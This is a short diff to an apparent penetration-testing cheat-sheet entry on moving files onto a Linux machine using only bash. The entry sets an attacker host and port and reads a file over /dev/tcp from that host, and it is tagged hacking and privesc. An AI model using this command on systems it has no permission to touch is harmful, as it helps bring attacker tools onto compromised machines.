@@ -1,4 +1,5 @@
 # linux enumeration quick commands transfer / download files with just bash receive
+
 ```bash
 LHOST=1.2.3.4
 LPORT=443
@@ -17,4 +18,4 @@ bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
 
 Tags:
 
-    #command #hacking #privesc #enumeration 
+    #command #hacking #privesc #enumeration #DEL
